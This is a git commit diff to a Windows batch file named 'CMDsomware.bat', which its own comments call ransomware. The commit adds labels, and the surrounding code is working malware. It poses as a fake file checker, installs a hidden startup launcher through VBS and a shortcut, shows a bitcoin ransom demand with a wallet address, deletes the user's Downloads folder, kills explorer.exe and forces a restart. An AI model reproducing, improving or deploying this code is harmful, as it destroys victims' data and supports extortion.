2edc2a2d7265cfaef0ab965faedff1b70a982334
KeparYTbcc <67996155+KeparYTbcc@users.noreply.github.com>
2020-10-25 17:03:14 +0000

    Update CMDsomware.bat

--- CMDsomware.bat
+++ CMDsomware.bat
@@ -1,5 +1,6 @@
 @ECHO OFF
 
+::Check If The File Is Started As Administrator::
 goto check_Permissions
 
 :check_Permissions
@@ -14,6 +15,7 @@ goto check_Permissions
 
     pause >nul
 
+::Fake Bash File Checker::
 :start
 cls
 cd %appdata%
@@ -33,11 +35,13 @@ echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 set /p web= :  
 goto 1
 
+::Create A File To Start The Ransom Bash File At The Start Up, Invisibly::
+:1
 echo Set WshShell = CreateObject("WScript.Shell") >> ka.vbs
 echo WshShell.run chr(34) & "%appdata%\ka.bat" % Chr(34), 0 >> ka.vbs
 echo Set WshShell = Nothing >> ka.vbs
 
-:1
+::Fake Bash File Checking::
 cls 
 echo Verify 
 echo %web%
@@ -174,6 +178,7 @@ echo ---------------------------------------
 ping localhost -n 4 > nul
 cls 
 
+::Startup Ransomware::
 echo msg * To get back your normall shit... send 0,0031 bitcoin to: 13h4EMjcusGEMXo2z8pV9UGEGWd8cyiSZs >> ka.bat
 echo ping localhost -n 4 >> ka.bat
 echo msg RIP >> ka.bat
@@ -183,6 +188,7 @@ echo rmdir "%currentuser%\Downloads" >> ka.bat
 echo taskkill explorer.exe >> ka.bat
 echo goto lol >> ka.bat
 
+::Create The .lnk File For Start As Startup::
 set SCRIPT="GO.vbs"
  
 echo Set oWS = WScript.CreateObject("WScript.Shell") >> %SCRIPT%
@@ -195,15 +201,19 @@ cscript %SCRIPT%
 del %SCRIPT%
 cls
 
+::Fake Bash Verified::
 echo File as been Verify
 echo Stroke a key to see results
 pause > nul
 cls
+
+::Fake Bash Verified Bugging::
 echo F!LeS 4s b3En ^3r!fY
 echo 5tr0k3 4 k3Y t0 Se3 R35Ult5
 pause > nul
 cls
 
+::The Last Words::
 ping localhost -n 4 > nul
 echo ... Please @$y 4$4in
 ping localhost -n 2 > nul
@@ -218,4 +228,5 @@ echo its not good idea to restart you pc
 ping localhost -n 2 > nul
 echo shutdown -s
 echo oopsy
-shutdown -s 
+shutdown -r
+
